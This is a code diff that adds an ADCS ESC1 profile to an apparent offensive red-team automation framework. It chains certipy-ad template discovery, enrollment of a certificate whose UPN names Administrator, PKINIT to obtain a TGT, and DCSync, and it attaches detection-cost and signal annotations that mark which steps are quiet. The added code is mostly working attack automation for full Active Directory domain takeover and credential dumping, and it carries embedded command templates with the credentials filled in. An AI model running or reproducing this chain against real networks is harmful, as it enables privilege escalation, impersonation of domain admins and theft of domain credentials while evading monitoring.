@@ -486,6 +486,21 @@ SIGNALS_S4U2SELF = (
     DetectionSignal(kind="win-event", identifier="4769",
                     note="Kerberos service ticket request"),
 )
+SIGNALS_ESC1_DISCOVER = (
+    DetectionSignal(kind="ldap-write", identifier="CertificateTemplates enum",
+                    count=0,
+                    note="LDAP read on pKI-Certificate-Template (defensive-mon rarely alerts)"),
+)
+SIGNALS_ESC1_ENROLL = (
+    DetectionSignal(kind="http-req", identifier="certsrv/certfnsh.asp",
+                    note="certificate enrollment POST from operator IP"),
+    DetectionSignal(kind="win-event", identifier="4886",
+                    note="Certificate Services: request received"),
+    DetectionSignal(kind="win-event", identifier="4887",
+                    note="Certificate Services: request approved (auto-approved template)"),
+    DetectionSignal(kind="win-event", identifier="4768",
+                    note="TGT request adjacent to the enrolled cert (PKINIT)"),
+)
 
 
 def _stub_action(msg):
@@ -932,6 +947,186 @@ def _petitpotam_action(chain, ctx):
         }})
 
 
+# ---------------------------------------------------------------- esc1 steps
+
+def _esc1_discover_action(chain, ctx):
+    """Use `certipy find` to enumerate ADCS templates on the target
+    CA and identify ESC1-vulnerable ones (client-auth EKU +
+    ENROLLEE_SUPPLIES_SUBJECT + broad enrollment ACL). Populates
+    chain.artifacts with the discovered vulnerable-template names.
+
+    Reads:
+      * ctx.domain (required) — AD domain (CORP.LOCAL)
+      * ctx.cred (required) — {domain, username, password} for LDAP auth
+      * ctx.esc1_tool_bin (optional) — certipy-ad override
+      * ctx.esc1_timeout (optional) — subprocess timeout
+    """
+    import re as _re
+    import shutil
+    from . import runner as runner_mod
+    domain = getattr(ctx, "domain", None)
+    cred = getattr(ctx, "cred", None)
+    if not domain:
+        return Outcome(
+            kind="manual",
+            evidence="no domain on ctx — pass --domain <AD-DOMAIN> for ESC1 discover")
+    if not cred:
+        return Outcome(
+            kind="manual",
+            evidence="no cred on ctx — pass --cred-id <N> for ESC1 discover (needs LDAP auth)")
+    tool = getattr(ctx, "esc1_tool_bin", None) or shutil.which("certipy-ad")
+    if not tool:
+        return Outcome(
+            kind="manual",
+            evidence=(f"certipy-ad not on PATH; run:\n"
+                      f"  certipy-ad find -u '{cred.get('username','')}@{domain}' "
+                      f"-p '{cred.get('password','')}' -dc-ip {chain.target} "
+                      f"-vulnerable"))
+    user = cred.get("username", "")
+    pw = cred.get("password", "")
+    argv = [tool, "find",
+            "-u", f"{user}@{domain}",
+            "-p", pw,
+            "-dc-ip", chain.target,
+            "-vulnerable",
+            "-stdout"]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "esc1_timeout", 60))
+    if result.error and "not found" in result.error:
+        return Outcome(kind="manual",
+                        evidence=f"certipy-ad vanished before exec: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="certipy find timed out — CA may be unreachable",
+                        data={"detail": result.stdout + result.stderr})
+    output = result.stdout + result.stderr
+    # certipy's -vulnerable output lists templates under "ESC1"
+    # headings. Simplest parse: any line matching `Template Name`
+    # after an ESC1 header until the next ESC header or end.
+    templates = []
+    in_esc1 = False
+    for line in output.splitlines():
+        stripped = line.strip()
+        if _re.match(r"ESC1\b", stripped):
+            in_esc1 = True
+            continue
+        if _re.match(r"ESC\d+\b", stripped):
+            in_esc1 = False
+            continue
+        if in_esc1:
+            m = _re.match(r"Template Name\s*:\s*(.+)", stripped)
+            if m:
+                templates.append(m.group(1).strip())
+    # Also parse the CA name — certipy req needs it.
+    ca_name = ""
+    m = _re.search(r"CA Name\s*:\s*(.+)", output)
+    if m:
+        ca_name = m.group(1).strip()
+    if not templates:
+        return Outcome(
+            kind="skip",
+            evidence="no ESC1-vulnerable templates found — profile aborts (no target)",
+            data={"esc1_detail": output[-1024:]})
+    return Outcome(
+        kind="ok",
+        evidence=f"discovered {len(templates)} ESC1-vulnerable template(s): "
+                 f"{', '.join(templates[:3])}"
+                 + (f" +{len(templates)-3} more" if len(templates) > 3 else ""),
+        data={"esc1_templates": templates,
+              "esc1_ca_name": ca_name,
+              "esc1_first_template": templates[0]})
+
+
+def _esc1_enroll_action(chain, ctx):
+    """Use certipy-ad req to enroll a certificate against an ESC1
+    template with an alternative SAN (Subject Alternative Name)
+    that impersonates a Domain Admin. The resulting cert is
+    subject-alt for Administrator@<domain>; PKINIT with it lands
+    a TGT for Administrator.
+
+    Reads:
+      * chain.artifacts["esc1_first_template"] / ["esc1_ca_name"]
+        (from _esc1_discover_action)
+      * ctx.domain (required)
+      * ctx.cred (required — same LDAP-auth cred as discover)
+      * ctx.impersonate (default "Administrator") — the target UPN
+      * ctx.esc1_tool_bin / ctx.esc1_enroll_timeout
+    """
+    import re as _re
+    import shutil
+    from . import runner as runner_mod
+    template = chain.artifacts.get("esc1_first_template", "")
+    ca_name = chain.artifacts.get("esc1_ca_name", "")
+    domain = getattr(ctx, "domain", None)
+    cred = getattr(ctx, "cred", None)
+    impersonate = getattr(ctx, "impersonate", "Administrator")
+    if not (template and ca_name and domain and cred):
+        return Outcome(
+            kind="fail",
+            evidence="esc1_enroll needs template + ca_name + domain + cred — discover step must have failed")
+    tool = getattr(ctx, "esc1_tool_bin", None) or shutil.which("certipy-ad")
+    if not tool:
+        hint = (f"certipy-ad req -u '{cred.get('username','')}@{domain}' "
+                f"-p '{cred.get('password','')}' -ca '{ca_name}' -dc-ip {chain.target} "
+                f"-template '{template}' -upn '{impersonate}@{domain}'")
+        return Outcome(kind="manual",
+                        evidence=f"certipy-ad not on PATH; run:\n  {hint}")
+    user = cred.get("username", "")
+    pw = cred.get("password", "")
+    argv = [tool, "req",
+            "-u", f"{user}@{domain}",
+            "-p", pw,
+            "-ca", ca_name,
+            "-dc-ip", chain.target,
+            "-template", template,
+            "-upn", f"{impersonate}@{domain}"]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "esc1_enroll_timeout", 60))
+    if result.error and "not found" in result.error:
+        return Outcome(kind="manual",
+                        evidence=f"certipy-ad vanished before exec: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="certipy req timed out — CA enrollment unreachable",
+                        data={"detail": result.stdout + result.stderr})
+    output = result.stdout + result.stderr
+    # certipy saves the cert as `<upn>.pfx` and prints "Saved
+    # certificate and private key to `<path>`" on success.
+    m = _re.search(r"Saved certificate and private key to\s+['\"]?(\S+?\.pfx)",
+                   output)
+    if not m:
+        # Common failure: template's ACL didn't actually grant enrollment
+        # to our SA, or SubjectAlt SAN isn't allowed on this template.
+        if "PERMISSION_DENIED" in output or "access denied" in output.lower():
+            return Outcome(
+                kind="skip",
+                evidence="ESC1 enroll denied — template ACL doesn't grant to us",
+                data={"detail": output[-512:]})
+        return Outcome(
+            kind="fail",
+            evidence="ESC1 enroll failed — output did not report a saved PFX",
+            data={"detail": output[-512:]})
+    pfx_path = m.group(1)
+    # Read the PFX bytes back into artifacts so the post:pkinit-tgt
+    # step (reused from D4) can materialize + PKINIT it. certipy
+    # writes an unencrypted PFX.
+    import base64 as _b64
+    try:
+        with open(pfx_path, "rb") as fh:
+            cert_b64 = _b64.b64encode(fh.read()).decode()
+    except (OSError, IOError) as exc:
+        return Outcome(
+            kind="fail",
+            evidence=f"could not read PFX at {pfx_path}: {exc}",
+            data={"detail": output[-512:]})
+    principal = f"{domain.split('.')[0].upper()}/{impersonate}"
+    return Outcome(
+        kind="ok",
+        evidence=f"enrolled ESC1 cert for {impersonate}@{domain} via template "
+                 f"{template!r} → {pfx_path}",
+        data={"cert_bytes": cert_b64,
+              "cert_principal": principal,
+              "esc1_pfx_path": pfx_path})
+
+
 # ---------------------------------------------------------------- rbcd + smb-relay steps
 
 def _rbcd_capture_action(chain, ctx):
@@ -1245,4 +1440,55 @@ def smb_relay_exec_chain(target_smb, secondary_target=None, cred=None):
                  _smb_relay_capture_action,
                  detection_cost=3,
                  signals=SIGNALS_RELAY_CAPTURE_SMBEXEC),
+        ))
+
+
+# ---------------------------------------------------------------- esc1 profile
+
+@register("esc1")
+def esc1_chain(target_dc, ca_name=None, cred=None):
+    """AD Certificate Services ESC1: enroll a certificate against a
+    template that grants low-priv users enrollment + allows the
+    enrollee to specify an arbitrary Subject Alternative Name.
+    The cert's UPN SAN can name any principal (Administrator@corp);
+    PKINIT with it lands a TGT for that principal → DCSync.
+
+    Different from ESC8 in what generates the certificate: ESC8
+    coerces a machine account to authenticate to a relay that
+    talks to the CA. ESC1 goes direct — the operator's low-priv
+    user is what enrolls, no coerce needed, so no PetitPotam +
+    no ntlmrelayx. Structurally simpler + quieter (no event 4624
+    on the coerced account); only lights up on ADCS deployments
+    with a misconfigured template.
+
+    5 steps:
+      reachability → discover → enroll → pkinit-tgt → dcsync
+    All 5 attacker-side + LDAP/HTTP-only; no coerce; no listener.
+    """
+    _ = ca_name, cred      # threaded through ctx by the CLI
+    return Chain(
+        profile="esc1",
+        target=target_dc,
+        steps=(
+            REACHABILITY_STEP,
+            Step("discover:esc1-templates",
+                 "attacker-side",
+                 _esc1_discover_action,
+                 detection_cost=1,
+                 signals=SIGNALS_ESC1_DISCOVER),
+            Step("exploit:esc1-enroll",
+                 "attacker-side",
+                 _esc1_enroll_action,
+                 detection_cost=2,
+                 signals=SIGNALS_ESC1_ENROLL),
+            Step("post:pkinit-tgt",
+                 "attacker-side",
+                 _pkinit_action,
+                 detection_cost=0,
+                 signals=SIGNALS_PKINIT_TGT),
+            Step("post:dcsync",
+                 "attacker-side",
+                 _dcsync_action,
+                 detection_cost=3,
+                 signals=SIGNALS_DCSYNC),
         ))
